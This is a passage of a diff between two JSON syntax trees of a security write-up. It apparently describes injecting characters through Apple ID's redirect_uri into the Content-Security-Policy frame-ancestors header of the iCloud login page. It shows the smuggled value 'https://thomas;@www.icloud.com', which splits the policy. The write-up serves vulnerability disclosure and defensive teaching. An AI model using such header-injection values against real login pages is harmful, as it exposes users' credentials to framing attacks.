>                       "line": 369,
>                       "column": 286,
>                       "offset": 18212
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": "\ncontaining the ",
>                   "position": {
>                     "start": {
>                       "line": 369,
>                       "column": 286,
>                       "offset": 18212
>                     },
>                     "end": {
>                       "line": 370,
>                       "column": 16,
>                       "offset": 18229
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "redirect_uri",
>                   "position": {
>                     "start": {
>                       "line": 370,
>                       "column": 16,
>                       "offset": 18229
>                     },
>                     "end": {
>                       "line": 370,
>                       "column": 30,
>                       "offset": 18243
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " ",
>                   "position": {
>                     "start": {
>                       "line": 370,
>                       "column": 30,
>                       "offset": 18243
>                     },
>                     "end": {
>                       "line": 370,
>                       "column": 31,
>                       "offset": 18244
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https://thomas@icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 370,
>                       "column": 31,
>                       "offset": 18244
>                     },
>                     "end": {
>                       "line": 370,
>                       "column": 58,
>                       "offset": 18271
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " what ",
>                   "position": {
>                     "start": {
>                       "line": 370,
>                       "column": 58,
>                       "offset": 18271
>                     },
>                     "end": {
>                       "line": 370,
>                       "column": 64,
>                       "offset": 18277
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "frame-ancestors",
>                   "position": {
>                     "start": {
>                       "line": 370,
>                       "column": 64,
>                       "offset": 18277
>                     },
>                     "end": {
>                       "line": 370,
>                       "column": 81,
>                       "offset": 18294
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": "\nheader do we get?",
>                   "position": {
>                     "start": {
>                       "line": 370,
>                       "column": 81,
>                       "offset": 18294
>                     },
>                     "end": {
>                       "line": 371,
>                       "column": 18,
>                       "offset": 18313
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 368,
>                   "column": 1,
>                   "offset": 17901
>                 },
>                 "end": {
>                   "line": 371,
>                   "column": 18,
>                   "offset": 18313
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "code",
>               "lang": "HTTP",
>               "meta": null,
>               "value": "Content-Security-Policy: frame-ancestors https://thomas@icloud.com",
>               "position": {
>                 "start": {
>                   "line": 373,
>                   "column": 1,
>                   "offset": 18317
>                 },
>                 "end": {
>                   "line": 375,
>                   "column": 4,
>                   "offset": 18398
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Hmm. That doesn't look like it should be there. ",
>                   "position": {
>                     "start": {
>                       "line": 377,
>                       "column": 1,
>                       "offset": 18402
>                     },
>                     "end": {
>                       "line": 377,
>                       "column": 49,
>                       "offset": 18450
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "frame-ancestors",
>                   "position": {
>                     "start": {
>                       "line": 377,
>                       "column": 49,
>                       "offset": 18450
>                     },
>                     "end": {
>                       "line": 377,
>                       "column": 66,
>                       "offset": 18467
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is defined to\naccept a list of ",
>                   "position": {
>                     "start": {
>                       "line": 377,
>                       "column": 66,
>                       "offset": 18467
>                     },
>                     "end": {
>                       "line": 378,
>                       "column": 18,
>                       "offset": 18500
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "linkReference",
>                   "identifier": "frame-ancestors",
>                   "label": "frame-ancestors",
>                   "referenceType": "full",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "HTTP origins",
>                       "position": {
>                         "start": {
>                           "line": 378,
>                           "column": 19,
>                           "offset": 18501
>                         },
>                         "end": {
>                           "line": 378,
>                           "column": 31,
>                           "offset": 18513
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 378,
>                       "column": 18,
>                       "offset": 18500
>                     },
>                     "end": {
>                       "line": 378,
>                       "column": 49,
>                       "offset": 18531
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", a very strict type of website specifier\ndesigned for security that ",
>                   "position": {
>                     "start": {
>                       "line": 378,
>                       "column": 49,
>                       "offset": 18531
>                     },
>                     "end": {
>                       "line": 379,
>                       "column": 28,
>                       "offset": 18601
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https://thomas@icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 379,
>                       "column": 28,
>                       "offset": 18601
>                     },
>                     "end": {
>                       "line": 379,
>                       "column": 55,
>                       "offset": 18628
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " most certianly is not.",
>                   "position": {
>                     "start": {
>                       "line": 379,
>                       "column": 55,
>                       "offset": 18628
>                     },
>                     "end": {
>                       "line": 379,
>                       "column": 78,
>                       "offset": 18651
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 377,
>                   "column": 1,
>                   "offset": 18402
>                 },
>                 "end": {
>                   "line": 379,
>                   "column": 78,
>                   "offset": 18651
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "definition",
>               "identifier": "frame-ancestors",
>               "label": "frame-ancestors",
>               "title": null,
>               "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors",
>               "position": {
>                 "start": {
>                   "line": 381,
>                   "column": 1,
>                   "offset": 18655
>                 },
>                 "end": {
>                   "line": 382,
>                   "column": 98,
>                   "offset": 18772
>                 },
>                 "indent": [
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "When I see stuff like this it makes me think for two reasons: (1) if\n",
>                   "position": {
>                     "start": {
>                       "line": 384,
>                       "column": 1,
>                       "offset": 18776
>                     },
>                     "end": {
>                       "line": 385,
>                       "column": 1,
>                       "offset": 18846
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "frame-ancestors",
>                   "position": {
>                     "start": {
>                       "line": 385,
>                       "column": 1,
>                       "offset": 18846
>                     },
>                     "end": {
>                       "line": 385,
>                       "column": 18,
>                       "offset": 18863
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is consuming something that isn't an HTTP Origin then the\nauthors probably didn't expect what I'm currently doing and (2) since the origin\nisn't extracted from the URL, they're ",
>                   "position": {
>                     "start": {
>                       "line": 385,
>                       "column": 18,
>                       "offset": 18863
>                     },
>                     "end": {
>                       "line": 387,
>                       "column": 39,
>                       "offset": 19043
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "validating",
>                       "position": {
>                         "start": {
>                           "line": 387,
>                           "column": 40,
>                           "offset": 19044
>                         },
>                         "end": {
>                           "line": 387,
>                           "column": 50,
>                           "offset": 19054
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 387,
>                       "column": 39,
>                       "offset": 19043
>                     },
>                     "end": {
>                       "line": 387,
>                       "column": 51,
>                       "offset": 19055
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " the URL rather than\n",
>                   "position": {
>                     "start": {
>                       "line": 387,
>                       "column": 51,
>                       "offset": 19055
>                     },
>                     "end": {
>                       "line": 388,
>                       "column": 1,
>                       "offset": 19077
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "transforming",
>                       "position": {
>                         "start": {
>                           "line": 388,
>                           "column": 2,
>                           "offset": 19078
>                         },
>                         "end": {
>                           "line": 388,
>                           "column": 14,
>                           "offset": 19090
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 388,
>                       "column": 1,
>                       "offset": 19077
>                     },
>                     "end": {
>                       "line": 388,
>                       "column": 15,
>                       "offset": 19091
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " it.",
>                   "position": {
>                     "start": {
>                       "line": 388,
>                       "column": 15,
>                       "offset": 19091
>                     },
>                     "end": {
>                       "line": 388,
>                       "column": 19,
>                       "offset": 19095
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 384,
>                   "column": 1,
>                   "offset": 18776
>                 },
>                 "end": {
>                   "line": 388,
>                   "column": 19,
>                   "offset": 19095
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Transformation rather than validation is something I personally try to push a\nlot. Almost always in a system, one's own understanding of everything about the\ntechnology you're working with is incomplete. For example, here the authors of\nthe Apple ID login system didn't know about this URL syntax. If we ",
>                   "position": {
>                     "start": {
>                       "line": 390,
>                       "column": 1,
>                       "offset": 19099
>                     },
>                     "end": {
>                       "line": 393,
>                       "column": 68,
>                       "offset": 19406
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "transform",
>                       "position": {
>                         "start": {
>                           "line": 393,
>                           "column": 69,
>                           "offset": 19407
>                         },
>                         "end": {
>                           "line": 393,
>                           "column": 78,
>                           "offset": 19416
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 393,
>                       "column": 68,
>                       "offset": 19406
>                     },
>                     "end": {
>                       "line": 393,
>                       "column": 79,
>                       "offset": 19417
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": "\nthe inputs we get including only the information we expect and understand, we\nstrip out a lot of potential for esoteric functionality to bypass our security\ncontrols.",
>                   "position": {
>                     "start": {
>                       "line": 393,
>                       "column": 79,
>                       "offset": 19417
>                     },
>                     "end": {
>                       "line": 396,
>                       "column": 10,
>                       "offset": 19587
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 390,
>                   "column": 1,
>                   "offset": 19099
>                 },
>                 "end": {
>                   "line": 396,
>                   "column": 10,
>                   "offset": 19587
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Since Apple ",
>                   "position": {
>                     "start": {
>                       "line": 398,
>                       "column": 1,
>                       "offset": 19591
>                     },
>                     "end": {
>                       "line": 398,
>                       "column": 13,
>                       "offset": 19603
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "validated",
>                       "position": {
>                         "start": {
>                           "line": 398,
>                           "column": 14,
>                           "offset": 19604
>                         },
>                         "end": {
>                           "line": 398,
>                           "column": 23,
>                           "offset": 19613
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 398,
>                       "column": 13,
>                       "offset": 19603
>                     },
>                     "end": {
>                       "line": 398,
>                       "column": 24,
>                       "offset": 19614
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " rather than transforming, the URL met their criteria for\nwhat a 'safe' URL looked like and passed through. But -- based on my tests,\nApple definitely actually ",
>                   "position": {
>                     "start": {
>                       "line": 398,
>                       "column": 24,
>                       "offset": 19614
>                     },
>                     "end": {
>                       "line": 400,
>                       "column": 27,
>                       "offset": 19776
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "checks and validates",
>                       "position": {
>                         "start": {
>                           "line": 400,
>                           "column": 28,
>                           "offset": 19777
>                         },
>                         "end": {
>                           "line": 400,
>                           "column": 48,
>                           "offset": 19797
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 400,
>                       "column": 27,
>                       "offset": 19776
>                     },
>                     "end": {
>                       "line": 400,
>                       "column": 49,
>                       "offset": 19798
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " the origin of the submitted\n",
>                   "position": {
>                     "start": {
>                       "line": 400,
>                       "column": 49,
>                       "offset": 19798
>                     },
>                     "end": {
>                       "line": 401,
>                       "column": 1,
>                       "offset": 19828
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "redirect_uri",
>                   "position": {
>                     "start": {
>                       "line": 401,
>                       "column": 1,
>                       "offset": 19828
>                     },
>                     "end": {
>                       "line": 401,
>                       "column": 15,
>                       "offset": 19842
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ".",
>                   "position": {
>                     "start": {
>                       "line": 401,
>                       "column": 15,
>                       "offset": 19842
>                     },
>                     "end": {
>                       "line": 401,
>                       "column": 16,
>                       "offset": 19843
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 398,
>                   "column": 1,
>                   "offset": 19591
>                 },
>                 "end": {
>                   "line": 401,
>                   "column": 16,
>                   "offset": 19843
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "If, instead of deciding if the URL is good or not, they instead ",
>                   "position": {
>                     "start": {
>                       "line": 403,
>                       "column": 1,
>                       "offset": 19847
>                     },
>                     "end": {
>                       "line": 403,
>                       "column": 65,
>                       "offset": 19911
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "also",
>                       "position": {
>                         "start": {
>                           "line": 403,
>                           "column": 66,
>                           "offset": 19912
>                         },
>                         "end": {
>                           "line": 403,
>                           "column": 70,
>                           "offset": 19916
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 403,
>                       "column": 65,
>                       "offset": 19911
>                     },
>                     "end": {
>                       "line": 403,
>                       "column": 71,
>                       "offset": 19917
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " extracted\nwhich part they thought was good (",
>                   "position": {
>                     "start": {
>                       "line": 403,
>                       "column": 71,
>                       "offset": 19917
>                     },
>                     "end": {
>                       "line": 404,
>                       "column": 35,
>                       "offset": 19963
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https://icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 404,
>                       "column": 35,
>                       "offset": 19963
>                     },
>                     "end": {
>                       "line": 404,
>                       "column": 55,
>                       "offset": 19983
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ") then I wouldn't be able\nto inject characters here. I think of this as 'baking in' our understanding of\nwhat a URL looks like and forcing it conform to that understanding.",
>                   "position": {
>                     "start": {
>                       "line": 404,
>                       "column": 55,
>                       "offset": 19983
>                     },
>                     "end": {
>                       "line": 406,
>                       "column": 68,
>                       "offset": 20157
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 403,
>                   "column": 1,
>                   "offset": 19847
>                 },
>                 "end": {
>                   "line": 406,
>                   "column": 68,
>                   "offset": 20157
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             }
>           ],
>           "data": {
>             "hName": "section"
6329,6335c7530,7569
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 362,
<               "column": 20,
<               "offset": 17607
---
>           "type": "section",
>           "depth": 2,
>           "children": [
>             {
>               "type": "heading",
>               "depth": 2,
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Content Insecurity Policy {#content_insecurity_policy}",
>                   "position": {
>                     "start": {
>                       "line": 408,
>                       "column": 1,
>                       "offset": 20161
>                     },
>                     "end": {
>                       "line": 408,
>                       "column": 55,
>                       "offset": 20215
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 408,
>                   "column": 1,
>                   "offset": 20161
>                 },
>                 "end": {
>                   "line": 409,
>                   "column": 26,
>                   "offset": 20242
>                 },
>                 "indent": [
>                   1
>                 ]
>               }
6337,6340c7571,7589
<             "end": {
<               "line": 362,
<               "column": 37,
<               "offset": 17624
---
>             {
>               "type": "definition",
>               "identifier": "content insecurity policy",
>               "label": "Content Insecurity Policy",
>               "title": null,
>               "url": "#content_insecurity_policy",
>               "position": {
>                 "start": {
>                   "line": 411,
>                   "column": 1,
>                   "offset": 20246
>                 },
>                 "end": {
>                   "line": 411,
>                   "column": 56,
>                   "offset": 20301
>                 },
>                 "indent": []
>               }
6342c7591,8878
<             "indent": []
---
>             {
>               "type": "definition",
>               "identifier": "§4",
>               "label": "§4",
>               "title": null,
>               "url": "#content_insecurity_policy",
>               "position": {
>                 "start": {
>                   "line": 412,
>                   "column": 1,
>                   "offset": 20303
>                 },
>                 "end": {
>                   "line": 412,
>                   "column": 33,
>                   "offset": 20335
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "With the knowledge that I could sneak extra characters into the\n",
>                   "position": {
>                     "start": {
>                       "line": 414,
>                       "column": 1,
>                       "offset": 20339
>                     },
>                     "end": {
>                       "line": 415,
>                       "column": 1,
>                       "offset": 20404
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "frame-ancestors",
>                   "position": {
>                     "start": {
>                       "line": 415,
>                       "column": 1,
>                       "offset": 20404
>                     },
>                     "end": {
>                       "line": 415,
>                       "column": 18,
>                       "offset": 20421
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " directive that validates who can embed the iCloud (really\nApple ID) login form, I, well, immediately tried to inject something that would\nbreak and/or change the action of ",
>                   "position": {
>                     "start": {
>                       "line": 415,
>                       "column": 18,
>                       "offset": 20421
>                     },
>                     "end": {
>                       "line": 417,
>                       "column": 35,
>                       "offset": 20596
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "frame-ancestors",
>                   "position": {
>                     "start": {
>                       "line": 417,
>                       "column": 35,
>                       "offset": 20596
>                     },
>                     "end": {
>                       "line": 417,
>                       "column": 52,
>                       "offset": 20613
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ".",
>                   "position": {
>                     "start": {
>                       "line": 417,
>                       "column": 52,
>                       "offset": 20613
>                     },
>                     "end": {
>                       "line": 417,
>                       "column": 53,
>                       "offset": 20614
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 414,
>                   "column": 1,
>                   "offset": 20339
>                 },
>                 "end": {
>                   "line": 417,
>                   "column": 53,
>                   "offset": 20614
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Let's try:",
>                   "position": {
>                     "start": {
>                       "line": 419,
>                       "column": 1,
>                       "offset": 20618
>                     },
>                     "end": {
>                       "line": 419,
>                       "column": 11,
>                       "offset": 20628
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 419,
>                   "column": 1,
>                   "offset": 20618
>                 },
>                 "end": {
>                   "line": 419,
>                   "column": 11,
>                   "offset": 20628
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "code",
>               "lang": null,
>               "meta": null,
>               "value": "redirect_uri=https://thomas;@www.icloud.com",
>               "position": {
>                 "start": {
>                   "line": 421,
>                   "column": 1,
>                   "offset": 20632
>                 },
>                 "end": {
>                   "line": 423,
>                   "column": 4,
>                   "offset": 20685
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "This should be a totally valid HTTP Simple Authentication URL with the username\n",
>                   "position": {
>                     "start": {
>                       "line": 425,
>                       "column": 1,
>                       "offset": 20689
>                     },
>                     "end": {
>                       "line": 426,
>                       "column": 1,
>                       "offset": 20770
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "thomas;",
>                   "position": {
>                     "start": {
>                       "line": 426,
>                       "column": 1,
>                       "offset": 20770
>                     },
>                     "end": {
>                       "line": 426,
>                       "column": 10,
>                       "offset": 20779
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", but ",
>                   "position": {
>                     "start": {
>                       "line": 426,
>                       "column": 10,
>                       "offset": 20779
>                     },
>                     "end": {
>                       "line": 426,
>                       "column": 16,
>                       "offset": 20785
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": ";",
>                   "position": {
>                     "start": {
>                       "line": 426,
>                       "column": 16,
>                       "offset": 20785
>                     },
>                     "end": {
>                       "line": 426,
>                       "column": 19,
>                       "offset": 20788
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is an important character in ",
>                   "position": {
>                     "start": {
>                       "line": 426,
>                       "column": 19,
>                       "offset": 20788
>                     },
>                     "end": {
>                       "line": 426,
>                       "column": 49,
>                       "offset": 20818
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "Content-Security-Policy",
>                   "position": {
>                     "start": {
>                       "line": 426,
>                       "column": 49,
>                       "offset": 20818
>                     },
>                     "end": {
>                       "line": 426,
>                       "column": 74,
>                       "offset": 20843
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " as it\nis used to mark the end of each policy segment, for example:",
>                   "position": {
>                     "start": {
>                       "line": 426,
>                       "column": 74,
>                       "offset": 20843
>                     },
>                     "end": {
>                       "line": 427,
>                       "column": 61,
>                       "offset": 20911
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 425,
>                   "column": 1,
>                   "offset": 20689
>                 },
>                 "end": {
>                   "line": 427,
>                   "column": 61,
>                   "offset": 20911
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "code",
>               "lang": "HTTP",
>               "meta": null,
>               "value": "Content-Security-Policy: default-src https://google.com; frame-ancestors https://mywebsite2.com",
>               "position": {
>                 "start": {
>                   "line": 429,
>                   "column": 1,
>                   "offset": 20915
>                 },
>                 "end": {
>                   "line": 431,
>                   "column": 4,
>                   "offset": 21025
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "This Content Security Policy dictates that valid resources can only be loaded\nfrom the HTTP origin ",
>                   "position": {
>                     "start": {
>                       "line": 433,
>                       "column": 1,
>                       "offset": 21029
>                     },
>                     "end": {
>                       "line": 434,
>                       "column": 22,
>                       "offset": 21129
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https://google.com",
>                   "position": {
>                     "start": {
>                       "line": 434,
>                       "column": 22,
>                       "offset": 21129
>                     },
>                     "end": {
>                       "line": 434,
>                       "column": 42,
>                       "offset": 21149
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", and that this page can only be\nembedded by ",
>                   "position": {
>                     "start": {
>                       "line": 434,
>                       "column": 42,
>                       "offset": 21149
>                     },
>                     "end": {
>                       "line": 435,
>                       "column": 13,
>                       "offset": 21195
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https://mywebsite2.com",
>                   "position": {
>                     "start": {
>                       "line": 435,
>                       "column": 13,
>                       "offset": 21195
>                     },
>                     "end": {
>                       "line": 435,
>                       "column": 37,
>                       "offset": 21219
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ".",
>                   "position": {
>                     "start": {
>                       "line": 435,
>                       "column": 37,
>                       "offset": 21219
>                     },
>                     "end": {
>                       "line": 435,
>                       "column": 38,
>                       "offset": 21220
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 433,
>                   "column": 1,
>                   "offset": 21029
>                 },
>                 "end": {
>                   "line": 435,
>                   "column": 38,
>                   "offset": 21220
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "I digressed: what actually happens? Check it out:",
>                   "position": {
>                     "start": {
>                       "line": 437,
>                       "column": 1,
>                       "offset": 21224
>                     },
>                     "end": {
>                       "line": 437,
>                       "column": 50,
>                       "offset": 21273
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 437,
>                   "column": 1,
>                   "offset": 21224
>                 },
>                 "end": {
>                   "line": 437,
>                   "column": 50,
>                   "offset": 21273
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "code",
>               "lang": "HTTP",
>               "meta": null,
>               "value": "Content-Security-Policy: frame-ancestors https://thomas;@www.icloud.com",
>               "position": {
>                 "start": {
>                   "line": 439,
>                   "column": 1,
>                   "offset": 21277
>                 },
>                 "end": {
>                   "line": 441,
>                   "column": 4,
>                   "offset": 21362
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "That's gotta break something, right? Correct. The Google Chrome console tells\nme, helpfully:",
>                   "position": {
>                     "start": {
>                       "line": 443,
>                       "column": 1,
>                       "offset": 21366
>                     },
>                     "end": {
>                       "line": 444,
>                       "column": 15,
>                       "offset": 21459
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 443,
>                   "column": 1,
>                   "offset": 21366
>                 },
>                 "end": {
>                   "line": 444,
>                   "column": 15,
>                   "offset": 21459
>                 },
>                 "indent": [
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "code",
>               "lang": null,
>               "meta": null,
>               "value": "Unrecognised Content-Security-Policy directive '@www.icloud.com'",
>               "position": {
>                 "start": {
>                   "line": 446,
>                   "column": 1,
>                   "offset": 21463
>                 },
>                 "end": {
>                   "line": 448,
>                   "column": 4,
>                   "offset": 21537
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "This means the browser now thinks a valid origin to embed the iCloud\nathentication dialog at ",
>                   "position": {
>                     "start": {
>                       "line": 450,
>                       "column": 1,
>                       "offset": 21541
>                     },
>                     "end": {
>                       "line": 451,
>                       "column": 25,
>                       "offset": 21635
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 451,
>                       "column": 25,
>                       "offset": 21635
>                     },
>                     "end": {
>                       "line": 451,
>                       "column": 42,
>                       "offset": 21652
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is ",
>                   "position": {
>                     "start": {
>                       "line": 451,
>                       "column": 42,
>                       "offset": 21652
>                     },
>                     "end": {
>                       "line": 451,
>                       "column": 46,
>                       "offset": 21656
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https://thomas",
>                   "position": {
>                     "start": {
>                       "line": 451,
>                       "column": 46,
>                       "offset": 21656
>                     },
>                     "end": {
>                       "line": 451,
>                       "column": 62,
>                       "offset": 21672
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ".",
>                   "position": {
>                     "start": {
>                       "line": 451,
>                       "column": 62,
>                       "offset": 21672
>                     },
>                     "end": {
>                       "line": 451,
>                       "column": 63,
>                       "offset": 21673
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 450,
>                   "column": 1,
>                   "offset": 21541
>                 },
>                 "end": {
>                   "line": 451,
>                   "column": 63,
>                   "offset": 21673
>                 },
>                 "indent": [
>                   1
>                 ]
>               }
>             },
>             {
